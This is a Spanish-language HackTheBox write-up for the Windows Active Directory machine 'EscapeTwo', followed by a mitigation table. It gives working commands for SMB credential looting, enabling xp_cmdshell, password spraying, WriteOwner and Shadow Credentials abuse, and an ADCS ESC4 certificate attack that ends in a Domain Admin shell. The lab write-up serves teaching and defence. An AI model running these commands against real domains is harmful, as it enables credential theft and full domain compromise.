@@ -1,0 +1,252 @@
+---
+title: "EscapeTwo"
+platform: "HackTheBox"
+os: "Windows"
+difficulty: "Easy"
+date: 2026-10-18
+tags: ["active-directory", "mssql", "adcs", "esc4", "password-reuse", "acl-abuse", "assumed-breach"]
+summary: "DC de Active Directory en modo assumed-breach. De unas credenciales iniciales a Domain Admin encadenando fuga de credenciales en un share SMB, abuso de MSSQL con xp_cmdshell, reutilización de contraseñas vía password spraying, abuso de ACL (WriteOwner) y explotación de una plantilla de certificado vulnerable en ADCS (ESC4)."
+---
+
+## Resumen
+
+EscapeTwo es una máquina **Windows (Active Directory)** de dificultad *Easy* en modo **assumed breach**: la plataforma entrega unas credenciales de bajo privilegio (`rose`) y el objetivo es escalar hasta **Domain Admin**.
+
+La cadena de ataque completa:
+
+1. **Enumeración SMB** con `rose` → share no estándar *Accounting Department* con un Excel que filtra credenciales.
+2. **MSSQL** como `sa` → `xp_cmdshell` → ejecución de comandos como la cuenta de servicio `sql_svc`.
+3. Lectura del fichero de instalación de SQL Server → **contraseña en claro de `sql_svc`**.
+4. **Password spraying** → `ryan` reutiliza la contraseña de `sql_svc`.
+5. **Abuso de ACL**: `ryan` tiene `WriteOwner` sobre `ca_svc` → toma de control de la cuenta.
+6. **ADCS / ESC4**: `ca_svc` (miembro de *Cert Publishers*) puede reconfigurar una plantilla de certificado vulnerable → certificado de `Administrator` → hash NT → shell como Domain Admin.
+
+<Callout type="note">
+El hilo conductor de la box es la **reutilización de credenciales** entre cuentas de servicio y cuentas de persona. Cada vez que consigues una contraseña nueva, el reflejo debe ser probarla contra toda la lista de usuarios del dominio.
+</Callout>
+
+---
+
+## Reconocimiento
+
+### Escaneo de puertos
+
+El `nmap` revela un **Domain Controller** clásico. Los servicios clave:
+
+| Puerto | Servicio | Nota |
+|--------|----------|------|
+| 1433 | MSSQL 2019 | Microsoft SQL Server 2019 RTM |
+| 3268 | LDAP (Global Catalog) | Confirma AD |
+| 445 | SMB | `signing:True`, `Null Auth:True` |
+| 5985 | WinRM | Para shell remota |
+| 389/636 | LDAP/LDAPS | |
+
+El propio banner NTLM del MSSQL regala la topología del dominio:
+
+- Dominio: **sequel.htb**
+- Host: **DC01.sequel.htb**
+
+### Preparación
+
+```bash
+echo "10.129.232.128  sequel.htb DC01.sequel.htb DC01" | sudo tee -a /etc/hosts
+```
+
+### LDAP anónimo
+
+El `RootDSE` es legible sin autenticar y confirma los *naming contexts* (`DC=sequel,DC=htb`, `Configuration`, `Schema`, `DomainDnsZones`, `ForestDnsZones`). Útil para fijar el *base DN* de consultas posteriores.
+
+<Callout type="tip">
+Que LDAP liste los *naming contexts* del RootDSE **no** significa que deje leer dentro de ellos. Son cosas distintas: el índice siempre es visible; el contenido depende de si hay *anonymous bind* con lectura.
+</Callout>
+
+---
+
+## Foothold
+
+### Validación de credenciales
+
+Con las credenciales iniciales (`rose`), se valida servicio por servicio con `netexec`:
+
+```bash
+nxc smb   sequel.htb -u 'rose' -p '<pass>'   # [+] OK  → lee shares
+nxc winrm sequel.htb -u 'rose' -p '<pass>'   # [-] no  → sin shell directa
+nxc mssql sequel.htb -u 'rose' -p '<pass>'   # [+] OK  → login en SQL
+nxc ldap  sequel.htb -u 'rose' -p '<pass>'   # [+] OK  → BloodHound
+```
+
+`rose` entra a leer, pero **no tiene WinRM** → hay que minar información.
+
+### Fuga de credenciales en SMB
+
+```bash
+nxc smb sequel.htb -u 'rose' -p '<pass>' --shares
+```
+
+Aparece un share **no estándar**: *Accounting Department* (READ). Dentro, un fichero Excel (`.xlsx`).
+
+```bash
+smbclient "//sequel.htb/Accounting Department" -U 'sequel.htb\rose%<pass>'
+# recurse ON; prompt OFF; mget *
+```
+
+Un `.xlsx` es un ZIP: la forma rápida de leer su texto sin abrir LibreOffice es extraer `sharedStrings.xml`:
+
+```bash
+unzip -o accounting.xlsx -d dump/
+cat dump/xl/sharedStrings.xml | sed 's/<[^>]*>/\n/g' | grep -v '^$'
+```
+
+La hoja contiene una tabla de usuarios con contraseñas, incluida la cuenta **`sa`** (System Administrator de SQL Server) con su contraseña.
+
+<Callout type="warning">
+`sa` es el superadmin del **motor SQL**, no una cuenta de Windows. Verla junto a correos de personas en una hoja de "contabilidad" es la pista de que el camino pasa por MSSQL.
+</Callout>
+
+### MSSQL → RCE con xp_cmdshell
+
+La contraseña de `sa` valida contra el SQL (login **local**, por eso `--local-auth`):
+
+```bash
+nxc mssql sequel.htb -u 'sa' -p '<pass_sa>' --local-auth
+# [+] (Pwn3d!)
+```
+
+Como `sa` es sysadmin, se habilita `xp_cmdshell` y se ejecutan comandos del SO:
+
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';   -- sequel\sql_svc
+```
+
+<Callout type="note">
+Te autenticas **como `sa`** (login SQL), pero los comandos del SO corren bajo la cuenta de Windows del servicio: **`sequel\sql_svc`**. `sa` es el medio (RCE), no el destino.
+</Callout>
+
+El `whoami /priv` muestra que **no** hay `SeImpersonatePrivilege` → se descarta el privesc local tipo *Potato*. El camino es por **relaciones de AD**.
+
+### Contraseña de sql_svc en el fichero de instalación
+
+SQL Server deja el fichero de respuesta de instalación con credenciales en claro:
+
+```bash
+nxc mssql sequel.htb -u 'sa' -p '<pass_sa>' --local-auth \
+  -x "type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"
+```
+
+```ini
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="<pass_sql_svc>"      ; <-- en claro
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
+```
+
+A diferencia de `sa`, **`sql_svc` sí es una cuenta de dominio** → credencial reutilizable.
+
+---
+
+## Escalada de privilegios
+
+### Password spraying → ryan
+
+El reflejo clave: probar la contraseña de `sql_svc` contra **todos** los usuarios del dominio.
+
+```bash
+nxc smb sequel.htb -u 'sql_svc' -p '<pass_sql_svc>' --users | awk '{print $5}' > users.txt
+nxc smb sequel.htb -u users.txt -p '<pass_sql_svc>' --continue-on-success
+```
+
+Resultado: **`ryan` reutiliza la misma contraseña** que `sql_svc`.
+
+<Callout type="tip">
+`--continue-on-success` es imprescindible: sin él, `netexec` para en el primer acierto y te pierdes otras cuentas que reutilicen la misma clave.
+</Callout>
+
+### Abuso de ACL: WriteOwner sobre ca_svc
+
+BloodHound (marcando `rose`/`sql_svc`/`ryan` como *Owned*) revela que **`ryan` tiene `WriteOwner` sobre `ca_svc`**. `WriteOwner` es un permiso, no un acceso: hay que convertirlo en control efectivo mediante una cadena de tres pasos.
+
+```bash
+# 1. Hacerse owner de ca_svc
+owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'<pass>'
+
+# 2. Darse FullControl sobre ca_svc
+dacledit.py -action write -rights FullControl -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'<pass>'
+
+# 3. Tomar control de la cuenta vía Shadow Credentials (sin romper la contraseña)
+certipy-ad shadow auto -u 'ryan@sequel.htb' -p '<pass>' -account 'ca_svc' -dc-ip 10.129.232.128
+# -> devuelve el hash NT de ca_svc
+```
+
+<Callout type="note">
+**Shadow Credentials** abusa de `msDS-KeyCredentialLink` para autenticarse vía PKINIT sin cambiar la contraseña de la víctima. Más limpio y reversible que un cambio de password — importante en un pentest real.
+</Callout>
+
+### ADCS — ESC4
+
+Con el hash de `ca_svc`, se enumera la CA. La plantilla **DunderMifflinAuthentication** sale marcada como vulnerable a **ESC4**:
+
+```bash
+certipy-ad find -u 'ca_svc@sequel.htb' -hashes '<hash_ca_svc>' \
+  -dc-ip 10.129.232.128 -vulnerable -stdout
+```
+
+```
+Template Name : DunderMifflinAuthentication
+Client Authentication : True
+Certificate Name Flag : SubjectAltRequireDns   ; <-- exige DNS en el SAN
+[!] Vulnerabilities
+    ESC4 : User has dangerous permissions.
+```
+
+**ESC4** = la cuenta controlada (`ca_svc`, miembro de *Cert Publishers*) tiene permisos de **escritura** sobre la plantilla. Si puedes reescribir las reglas, las reglas no te limitan: se reconfigura la plantilla para volverla una **ESC1** (permitir SAN arbitrario).
+
+```bash
+# 1. Reconfigurar la plantilla (volverla vulnerable, guardando backup)
+certipy-ad template -u 'ca_svc@sequel.htb' -hashes '<hash_ca_svc>' \
+  -template 'DunderMifflinAuthentication' -dc-ip 10.129.232.128 -save-configuration before.json
+
+# 2. Solicitar certificado suplantando a Administrator
+certipy-ad req -u 'ca_svc@sequel.htb' -hashes '<hash_ca_svc>' \
+  -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' \
+  -upn 'administrator@sequel.htb' -dc-ip 10.129.232.128
+
+# 3. Autenticar con el certificado -> hash NT de Administrator
+certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.232.128
+```
+
+<Callout type="warning">
+Si el paso 2 falla con `CERTSRV_E_SUBJECT_DNS_REQUIRED`, es que la plantilla **no se reconfiguró** en el paso 1 y sigue exigiendo un DNS name (`SubjectAltRequireDns`). La solución no es cambiar el `req`, sino asegurarse de que el `template` se aplicó. Ojo también a la sintaxis: **Certipy v5 cambió los flags** de ESC4 respecto a la v4 — verifica con `certipy-ad template -h`.
+</Callout>
+
+### Domain Admin
+
+El `certipy auth` devuelve el hash NTLM de `Administrator` en formato `LM:NT`. Para `evil-winrm` se usa **solo la parte NT**:
+
+```bash
+evil-winrm -i sequel.htb -u Administrator -H <hash_NT>
+```
+
+<Callout type="tip">
+`evil-winrm` da `Invalid hash format` si le pasas el par completo `aad3b4...:NT`. El `aad3b435b51404eeaad3b435b51404ee` es el LM vacío (constante): quédate solo con el NT de 32 hex.
+</Callout>
+
+Acceso como **Domain Admin**. Ambas flags capturadas. Como higiene final, se restaura la plantilla a su configuración original:
+
+```bash
+certipy-ad template -u 'ca_svc@sequel.htb' -hashes '<hash_ca_svc>' \
+  -template 'DunderMifflinAuthentication' -configuration before.json
+```
+
+---
+
+## Lecciones y mitigaciones
+
+| # | Problema | Mitigación |
+|---|----------|------------|
+| 1 | Credenciales en claro en un share SMB legible (Excel de contabilidad) | No almacenar secretos en ficheros compartidos; segmentar permisos de los shares por necesidad real |
+| 2 | Cuenta `sa` con contraseña débil y `xp_cmdshell` disponible | Deshabilitar `sa`, usar autenticación integrada de Windows, mantener `xp_cmdshell` deshabilitado |
+| 3 | Contraseña de la cuenta de servicio en claro en `sql-Configuration.INI` | Borrar los ficheros de instalación tras el despliegue; rotar la credencial de servicio |
+| 4 | Reutilización de contraseña entre `sql_svc` y `ryan` | Contraseñas únicas por cuenta; usar gMSA para cuentas de servicio |
+| 5 | ACL excesiva: `WriteOwner` de un usuario sobre una cuenta de servicio de CA | Revisar y restringir ACLs sobre objetos sensibles; auditar con BloodHound |
+| 6 | Plantilla de certificado reconfigurable por *Cert Publishers* (ESC4) | Restringir permisos de escritura sobre plantillas a administradores de PKI; auditar ADCS con Certipy |
